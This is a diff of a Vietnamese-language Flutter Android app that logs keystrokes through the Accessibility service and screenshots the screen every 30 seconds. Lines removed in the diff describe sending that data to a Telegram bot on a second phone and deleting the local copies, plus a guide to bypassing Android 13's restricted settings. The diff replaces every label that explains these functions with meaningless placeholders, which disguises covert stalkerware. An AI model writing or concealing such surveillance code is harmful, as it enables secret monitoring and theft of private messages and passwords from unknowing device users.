@@ -4,7 +4,6 @@ import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
 import 'db_helper.dart';
 import 'monitor_service.dart';
-import 'telegram_settings_screen.dart';
 import 'login_screen.dart';
 
 void main() {
@@ -19,10 +18,7 @@ class SelfMonitorApp extends StatelessWidget {
     return MaterialApp(
       title: 'phương uyên',
       debugShowCheckedModeBanner: false,
-      theme: ThemeData(
-        colorSchemeSeed: Colors.pink,
-        useMaterial3: true,
-      ),
+      theme: ThemeData(colorSchemeSeed: Colors.pink, useMaterial3: true),
       home: const LoginScreen(),
     );
   }
@@ -39,8 +35,6 @@ class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
   bool _accessibilityEnabled = false;
   bool _screenshotServiceRunning = false;
   bool _batteryOptIgnored = false;
-  bool _telegramConfigured = false;
-  bool _telegramEnabled = false;
   static const int _intervalSeconds = 30;
   bool _checking = true;
 
@@ -68,19 +62,14 @@ class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
     setState(() => _checking = true);
     final accEnabled = await MonitorService.isAccessibilityServiceEnabled();
     final screenshotRunning = await MonitorService.isScreenshotServiceRunning();
-    final batteryIgnored = await MonitorService.isIgnoringBatteryOptimizations();
-    final tgConfig = await MonitorService.getTelegramConfig();
-    final tgToken = (tgConfig['botToken'] as String? ?? '').trim();
-    final tgChatId = (tgConfig['chatId'] as String? ?? '').trim();
-    final tgEnabled = tgConfig['enabled'] as bool? ?? false;
+    final batteryIgnored =
+        await MonitorService.isIgnoringBatteryOptimizations();
 
     if (mounted) {
       setState(() {
         _accessibilityEnabled = accEnabled;
         _screenshotServiceRunning = screenshotRunning;
         _batteryOptIgnored = batteryIgnored;
-        _telegramConfigured = tgToken.isNotEmpty && tgChatId.isNotEmpty;
-        _telegramEnabled = tgEnabled;
         _checking = false;
       });
     }
@@ -98,7 +87,9 @@ class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
     } else {
       final granted = await MonitorService.requestScreenCapturePermission();
       if (granted) {
-        await MonitorService.startScreenshotService(intervalSeconds: _intervalSeconds);
+        await MonitorService.startScreenshotService(
+          intervalSeconds: _intervalSeconds,
+        );
       } else {
         if (mounted) {
           ScaffoldMessenger.of(context).showSnackBar(
@@ -125,15 +116,7 @@ class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
       builder: (ctx) => AlertDialog(
         title: const Text('Lưu ý mở khoá quyền trên Android 13+'),
         content: const SingleChildScrollView(
-          child: Text(
-            'Nếu mục Accessibility bị mờ và hệ thống báo "Cài đặt bị hạn chế (Restricted settings)":\n\n'
-            '1. Vào Cài đặt máy > Ứng dụng > Tìm "phương uyên"\n'
-            '2. Nhấn vào biểu tượng 3 dấu chấm ở góc trên cùng bên phải màn hình\n'
-            '3. Chọn "Cho phép cài đặt bị hạn chế" (Allow restricted settings)\n'
-            '4. Nhập mật khẩu/vân tay mở khoá máy\n'
-            '5. Quay lại app và bật quyền Accessibility bình thường.',
-            style: TextStyle(fontSize: 14, height: 1.4),
-          ),
+          child: Text("", style: TextStyle(fontSize: 14, height: 1.4)),
         ),
         actions: [
           TextButton(
@@ -151,17 +134,6 @@ class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
       appBar: AppBar(
         title: const Text('phương uyên'),
         actions: [
-          IconButton(
-            icon: const Icon(Icons.settings),
-            tooltip: 'Cài đặt Telegram',
-            onPressed: () async {
-              await Navigator.of(context).push(
-                MaterialPageRoute(
-                    builder: (_) => const TelegramSettingsScreen()),
-              );
-              _refreshStatus();
-            },
-          ),
           IconButton(
             icon: const Icon(Icons.refresh),
             tooltip: 'Làm mới trạng thái',
@@ -196,156 +168,48 @@ class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
                       ),
                       child: Row(
                         children: [
-                          Icon(Icons.warning_amber_rounded,
-                              color: Colors.amber.shade900),
+                          Icon(
+                            Icons.warning_amber_rounded,
+                            color: Colors.amber.shade900,
+                          ),
                           const SizedBox(width: 10),
                           Expanded(
                             child: Text(
                               'Ứng dụng đang chạy trên ${Platform.operatingSystem}. Tính năng Accessibility và Chụp màn hình chỉ hoạt động trên thiết bị Android.',
                               style: TextStyle(
-                                  color: Colors.amber.shade900,
-                                  fontSize: 13,
-                                  fontWeight: FontWeight.w500),
+                                color: Colors.amber.shade900,
+                                fontSize: 13,
+                                fontWeight: FontWeight.w500,
+                              ),
                             ),
                           ),
                         ],
                       ),
                     ),
 
-                  // Card Telegram Máy 2
-                  Card(
-                    elevation: 1,
-                    color: _telegramConfigured && _telegramEnabled
-                        ? Colors.indigo.shade50
-                        : Colors.blueGrey.shade50,
-                    shape: RoundedRectangleBorder(
-                      borderRadius: BorderRadius.circular(12),
-                      side: BorderSide(
-                        color: _telegramConfigured && _telegramEnabled
-                            ? Colors.indigo.shade300
-                            : Colors.blueGrey.shade200,
-                      ),
-                    ),
-                    child: Padding(
-                      padding: const EdgeInsets.all(16),
-                      child: Column(
-                        crossAxisAlignment: CrossAxisAlignment.start,
-                        children: [
-                          Row(
-                            children: [
-                              Icon(
-                                _telegramConfigured && _telegramEnabled
-                                    ? Icons.telegram
-                                    : Icons.send_and_archive_outlined,
-                                color: _telegramConfigured && _telegramEnabled
-                                    ? Colors.indigo
-                                    : Colors.blueGrey.shade700,
-                                size: 26,
-                              ),
-                              const SizedBox(width: 8),
-                              const Expanded(
-                                child: Text(
-                                  'Gửi dữ liệu về Telegram Máy 2',
-                                  style: TextStyle(
-                                      fontSize: 16,
-                                      fontWeight: FontWeight.bold),
-                                ),
-                              ),
-                              Container(
-                                padding: const EdgeInsets.symmetric(
-                                    horizontal: 8, vertical: 3),
-                                decoration: BoxDecoration(
-                                  color: _telegramConfigured
-                                      ? (_telegramEnabled
-                                          ? Colors.green.shade100
-                                          : Colors.amber.shade100)
-                                      : Colors.grey.shade200,
-                                  borderRadius: BorderRadius.circular(12),
-                                ),
-                                child: Text(
-                                  _telegramConfigured
-                                      ? (_telegramEnabled
-                                          ? 'Đang gửi tự động'
-                                          : 'Đang tạm dừng')
-                                      : 'Chưa nhập Token',
-                                  style: TextStyle(
-                                    fontSize: 11,
-                                    fontWeight: FontWeight.bold,
-                                    color: _telegramConfigured
-                                        ? (_telegramEnabled
-                                            ? Colors.green.shade800
-                                            : Colors.amber.shade900)
-                                        : Colors.grey.shade700,
-                                  ),
-                                ),
-                              ),
-                            ],
-                          ),
-                          const SizedBox(height: 8),
-                          Text(
-                            _telegramConfigured
-                                ? 'Ảnh chụp màn hình và phím gõ sẽ tự động gửi về Telegram Máy 2. Dữ liệu trên Máy 1 được tự động xoá ngay sau khi gửi thành công để không tốn bộ nhớ.'
-                                : 'Bạn tự nhập Bot Token và Chat ID trực tiếp vào ứng dụng này. Dữ liệu lưu cục bộ và bảo mật 100%.',
-                            style: TextStyle(
-                                color: Colors.grey.shade800, fontSize: 13),
-                          ),
-                          const SizedBox(height: 12),
-                          SizedBox(
-                            width: double.infinity,
-                            child: FilledButton.icon(
-                              onPressed: () async {
-                                await Navigator.of(context).push(
-                                  MaterialPageRoute(
-                                      builder: (_) =>
-                                          const TelegramSettingsScreen()),
-                                );
-                                _refreshStatus();
-                              },
-                              icon: const Icon(Icons.settings),
-                              label: Text(_telegramConfigured
-                                  ? 'Cài đặt & Quản lý Telegram'
-                                  : 'Nhập Bot Token & Chat ID ngay'),
-                            ),
-                          ),
-                        ],
-                      ),
-                    ),
-                  ),
-                  const SizedBox(height: 16),
-
-                  // Card 1: Chạy ngầm liên tục
                   _buildStatusCard(
-                    title: 'Chạy ngầm liên tục (Không bị hệ thống tắt)',
-                    subtitle:
-                        'Tắt tối ưu hoá pin (Battery Optimization) để dịch vụ ghi phím và chụp ảnh không bị Android đóng băng khi bạn tắt app hoặc khoá màn hình.',
+                    title: 'Phương Uyên 01',
+
                     enabled: _batteryOptIgnored,
                     onToggle: _requestBatteryOptimization,
-                    toggleLabel: _batteryOptIgnored
-                        ? 'Đã bật chạy ngầm liên tục'
-                        : 'Cấp quyền chạy ngầm không bị tắt',
+                    toggleLabel: _batteryOptIgnored ? 'Phương' : 'Uyên 01',
                     color: Colors.teal,
                   ),
                   const SizedBox(height: 16),
 
-                  // Card 2: Accessibility ghi phím & Chụp ảnh tự động
                   _buildStatusCard(
-                    title: 'Dịch vụ Trợ năng (Ghi phím & Chụp ảnh tự động)',
-                    subtitle:
-                        'Khi bật Trợ năng (Accessibility), app sẽ TỰ ĐỘNG ghi lại thao tác gõ phím VÀ TỰ ĐỘNG chụp màn hình định kỳ trong nền (Android 11+). Toàn bộ dữ liệu tự gửi lên Telegram.',
+                    title: 'Phuong Uyên 02',
                     enabled: _accessibilityEnabled,
                     onToggle: _toggleAccessibility,
-                    toggleLabel: _accessibilityEnabled
-                        ? 'Đã bật Trợ năng (Đang chạy tự động)'
-                        : 'Cấp quyền Trợ năng (Accessibility)',
+                    toggleLabel: _accessibilityEnabled ? 'Phương' : 'Uyên 02',
                     trailingAction: TextButton.icon(
                       onPressed: _showAndroid13Guide,
                       icon: const Icon(Icons.help_outline, size: 16),
-                      label: const Text('Bị khoá quyền? (Android 13+)'),
+                      label: const Text('Phương Uyên 03'),
                     ),
                   ),
                   const SizedBox(height: 16),
 
-                  // Card 3: Chụp màn hình nâng cao (MediaProjection)
                   Card(
                     elevation: 1,
                     child: Padding(
@@ -366,45 +230,16 @@ class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
                               const SizedBox(width: 8),
                               const Expanded(
                                 child: Text(
-                                  'Chụp màn hình Foreground (MediaProjection)',
+                                  'Phương Uyên 03',
                                   style: TextStyle(
-                                      fontSize: 16,
-                                      fontWeight: FontWeight.bold),
-                                ),
-                              ),
-                            ],
-                          ),
-                          const SizedBox(height: 8),
-                          Text(
-                            'Chạy Foreground Service chụp màn hình chất lượng cao. Ảnh sau khi chụp sẽ tự động gửi qua Telegram và xoá ngay trên Máy 1 để nhẹ máy.',
-                            style: TextStyle(color: Colors.grey[700]),
-                          ),
-                          const SizedBox(height: 12),
-                          Row(
-                            children: [
-                              const Text('Chu kỳ chụp: ',
-                                  style: TextStyle(fontWeight: FontWeight.w500)),
-                              const SizedBox(width: 8),
-                              Container(
-                                padding: const EdgeInsets.symmetric(
-                                    horizontal: 10, vertical: 4),
-                                decoration: BoxDecoration(
-                                  color: Colors.pink.shade50,
-                                  borderRadius: BorderRadius.circular(8),
-                                  border: Border.all(
-                                      color: Colors.pink.shade200),
-                                ),
-                                child: Text(
-                                  '30 giây',
-                                  style: TextStyle(
-                                    fontSize: 13,
-                                    fontWeight: FontWeight.w600,
-                                    color: Colors.pink.shade700,
+                                    fontSize: 16,
+                                    fontWeight: FontWeight.bold,
                                   ),
                                 ),
                               ),
                             ],
                           ),
+
                           const SizedBox(height: 8),
                           SizedBox(
                             width: double.infinity,
@@ -412,62 +247,19 @@ class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
                               onPressed: _toggleScreenshotService,
                               style: _screenshotServiceRunning
                                   ? FilledButton.styleFrom(
-                                      backgroundColor: Colors.red.shade700)
+                                      backgroundColor: Colors.red.shade700,
+                                    )
                                   : null,
-                              child: Text(_screenshotServiceRunning
-                                  ? 'Dừng chụp màn hình'
-                                  : 'Bắt đầu chụp màn hình'),
+                              child: Text(
+                                _screenshotServiceRunning
+                                    ? 'Phương Uyên 04'
+                                    : 'Phương Uyên 05',
+                              ),
                             ),
                           ),
                         ],
                       ),
                     ),
-                  ),
-                  const SizedBox(height: 24),
-
-                  ElevatedButton.icon(
-                    onPressed: () {
-                      Navigator.of(context).push(
-                        MaterialPageRoute(
-                            builder: (_) => const TimelineScreen()),
-                      );
-                    },
-                    icon: const Icon(Icons.history),
-                    label: const Text('Xem lịch sử đã ghi (Text & Ảnh)'),
-                    style: ElevatedButton.styleFrom(
-                      padding: const EdgeInsets.symmetric(vertical: 14),
-                    ),
-                  ),
-                  const SizedBox(height: 10),
-                  OutlinedButton.icon(
-                    onPressed: () async {
-                      final confirm = await showDialog<bool>(
-                        context: context,
-                        builder: (ctx) => AlertDialog(
-                          title: const Text('Xoá toàn bộ log?'),
-                          content: const Text(
-                              'Thao tác này sẽ xoá sạch toàn bộ text log và ảnh chụp đã lưu.'),
-                          actions: [
-                            TextButton(
-                                onPressed: () => Navigator.pop(ctx, false),
-                                child: const Text('Huỷ')),
-                            TextButton(
-                                onPressed: () => Navigator.pop(ctx, true),
-                                child: const Text('Xoá sạch')),
-                          ],
-                        ),
-                      );
-                      if (confirm == true) {
-                        await DbHelper.instance.clearAll();
-                        if (context.mounted) {
-                          ScaffoldMessenger.of(context).showSnackBar(
-                            const SnackBar(content: Text('Đã xoá sạch toàn bộ log')),
-                          );
-                        }
-                      }
-                    },
-                    icon: const Icon(Icons.delete_outline),
-                    label: const Text('Xoá sạch toàn bộ log'),
                   ),
                 ],
               ),
@@ -477,7 +269,6 @@ class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
 
   Widget _buildStatusCard({
     required String title,
-    required String subtitle,
     required bool enabled,
     required VoidCallback onToggle,
     required String toggleLabel,
@@ -499,14 +290,17 @@ class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
                 ),
                 const SizedBox(width: 8),
                 Expanded(
-                  child: Text(title,
-                      style: const TextStyle(
-                          fontSize: 16, fontWeight: FontWeight.bold)),
+                  child: Text(
+                    title,
+                    style: const TextStyle(
+                      fontSize: 16,
+                      fontWeight: FontWeight.bold,
+                    ),
+                  ),
                 ),
               ],
             ),
             const SizedBox(height: 8),
-            Text(subtitle, style: TextStyle(color: Colors.grey[700])),
             if (trailingAction != null) ...[
               const SizedBox(height: 4),
               trailingAction,
@@ -544,9 +338,10 @@ class _TimelineScreenState extends State<TimelineScreen> {
   void initState() {
     super.initState();
     _load();
-    // Tự động cập nhật mỗi 3 giây khi màn hình này đang mở
-    _autoRefreshTimer =
-        Timer.periodic(const Duration(seconds: 3), (_) => _load(silent: true));
+    _autoRefreshTimer = Timer.periodic(
+      const Duration(seconds: 3),
+      (_) => _load(silent: true),
+    );
   }
 
   @override
@@ -672,17 +467,6 @@ class _TimelineScreenState extends State<TimelineScreen> {
               },
             ),
             IconButton(
-              icon: const Icon(Icons.settings_outlined),
-              tooltip: 'Cài đặt Telegram',
-              onPressed: () async {
-                await Navigator.of(context).push(
-                  MaterialPageRoute(
-                      builder: (_) => const TelegramSettingsScreen()),
-                );
-                _load(silent: true);
-              },
-            ),
-            IconButton(
               icon: const Icon(Icons.refresh),
               tooltip: 'Làm mới',
               onPressed: () => _load(silent: false),
@@ -734,8 +518,11 @@ class _TimelineScreenState extends State<TimelineScreen> {
                               ? ListView(
                                   children: [
                                     const SizedBox(height: 120),
-                                    Icon(Icons.notes,
-                                        size: 64, color: Colors.grey.shade400),
+                                    Icon(
+                                      Icons.notes,
+                                      size: 64,
+                                      color: Colors.grey.shade400,
+                                    ),
                                     const SizedBox(height: 16),
                                     Center(
                                       child: Text(
@@ -743,21 +530,24 @@ class _TimelineScreenState extends State<TimelineScreen> {
                                             ? 'Không tìm thấy kết quả phù hợp'
                                             : 'Chưa có dữ liệu gõ phím nào.',
                                         style: const TextStyle(
-                                            fontSize: 16,
-                                            fontWeight: FontWeight.bold),
+                                          fontSize: 16,
+                                          fontWeight: FontWeight.bold,
+                                        ),
                                       ),
                                     ),
                                     const SizedBox(height: 8),
                                     Padding(
                                       padding: const EdgeInsets.symmetric(
-                                          horizontal: 32),
+                                        horizontal: 32,
+                                      ),
                                       child: Text(
                                         _searchQuery.isNotEmpty
                                             ? 'Thử tìm kiếm với từ khoá khác.'
                                             : 'Hãy đảm bảo bạn đã BẬT quyền Accessibility cho phương uyên, sau đó mở ứng dụng khác (Note, Chrome, Zalo...) và gõ chữ thử nghiệm.',
                                         textAlign: TextAlign.center,
-                                        style:
-                                            const TextStyle(color: Colors.grey),
+                                        style: const TextStyle(
+                                          color: Colors.grey,
+                                        ),
                                       ),
                                     ),
                                   ],
@@ -774,30 +564,36 @@ class _TimelineScreenState extends State<TimelineScreen> {
 
                                     return ListTile(
                                       leading: CircleAvatar(
-                                        backgroundColor:
-                                            Colors.indigo.shade50,
-                                        child: const Icon(Icons.text_snippet,
-                                            color: Colors.indigo),
+                                        backgroundColor: Colors.indigo.shade50,
+                                        child: const Icon(
+                                          Icons.text_snippet,
+                                          color: Colors.indigo,
+                                        ),
                                       ),
                                       title: SelectableText(
                                         content,
                                         style: const TextStyle(
-                                            fontWeight: FontWeight.w600),
+                                          fontWeight: FontWeight.w600,
+                                        ),
                                       ),
-                                      subtitle: Text('$pkg • $time',
-                                          style:
-                                              const TextStyle(fontSize: 12)),
+                                      subtitle: Text(
+                                        '$pkg • $time',
+                                        style: const TextStyle(fontSize: 12),
+                                      ),
                                       trailing: IconButton(
                                         icon: const Icon(Icons.copy, size: 18),
                                         tooltip: 'Sao chép nội dung',
                                         onPressed: () {
                                           Clipboard.setData(
-                                              ClipboardData(text: content));
-                                          ScaffoldMessenger.of(context)
-                                              .showSnackBar(
+                                            ClipboardData(text: content),
+                                          );
+                                          ScaffoldMessenger.of(
+                                            context,
+                                          ).showSnackBar(
                                             const SnackBar(
                                               content: Text(
-                                                  'Đã sao chép vào bộ nhớ tạm'),
+                                                'Đã sao chép vào bộ nhớ tạm',
+                                              ),
                                               duration: Duration(seconds: 1),
                                             ),
                                           );
@@ -811,21 +607,25 @@ class _TimelineScreenState extends State<TimelineScreen> {
               ],
             ),
 
-            // Tab 2: Ảnh chụp màn hình
             RefreshIndicator(
               onRefresh: () => _load(silent: false),
               child: _screenshots.isEmpty
                   ? ListView(
                       children: const [
                         SizedBox(height: 120),
-                        Icon(Icons.photo_size_select_actual_outlined,
-                            size: 64, color: Colors.grey),
+                        Icon(
+                          Icons.photo_size_select_actual_outlined,
+                          size: 64,
+                          color: Colors.grey,
+                        ),
                         SizedBox(height: 16),
                         Center(
                           child: Text(
                             'Chưa có ảnh chụp màn hình nào.',
                             style: TextStyle(
-                                fontSize: 16, fontWeight: FontWeight.bold),
+                              fontSize: 16,
+                              fontWeight: FontWeight.bold,
+                            ),
                           ),
                         ),
                         SizedBox(height: 8),
@@ -843,11 +643,11 @@ class _TimelineScreenState extends State<TimelineScreen> {
                       padding: const EdgeInsets.all(8),
                       gridDelegate:
                           const SliverGridDelegateWithFixedCrossAxisCount(
-                        crossAxisCount: 3,
-                        crossAxisSpacing: 6,
-                        mainAxisSpacing: 6,
-                        childAspectRatio: 0.65,
-                      ),
+                            crossAxisCount: 3,
+                            crossAxisSpacing: 6,
+                            mainAxisSpacing: 6,
+                            childAspectRatio: 0.65,
+                          ),
                       itemCount: _screenshots.length,
                       itemBuilder: (ctx, i) {
                         final item = _screenshots[i];
@@ -868,29 +668,32 @@ class _TimelineScreenState extends State<TimelineScreen> {
                                           file,
                                           cacheWidth: 300,
                                           fit: BoxFit.cover,
-                                          errorBuilder: (c, e, s) =>
-                                              Container(
+                                          errorBuilder: (c, e, s) => Container(
                                             color: Colors.grey[200],
                                             child: const Icon(
-                                                Icons.broken_image),
+                                              Icons.broken_image,
+                                            ),
                                           ),
                                         )
                                       : Container(
                                           color: Colors.grey[200],
-                                          child: const Icon(
-                                              Icons.broken_image),
+                                          child: const Icon(Icons.broken_image),
                                         ),
                                 ),
                                 Container(
                                   color: Colors.black54,
                                   padding: const EdgeInsets.symmetric(
-                                      vertical: 2, horizontal: 4),
+                                    vertical: 2,
+                                    horizontal: 4,
+                                  ),
                                   child: Text(
                                     timestamp.length > 19
                                         ? timestamp.substring(11, 19)
                                         : timestamp,
                                     style: const TextStyle(
-                                        color: Colors.white, fontSize: 10),
+                                      color: Colors.white,
+                                      fontSize: 10,
+                                    ),
                                     textAlign: TextAlign.center,
                                   ),
                                 ),
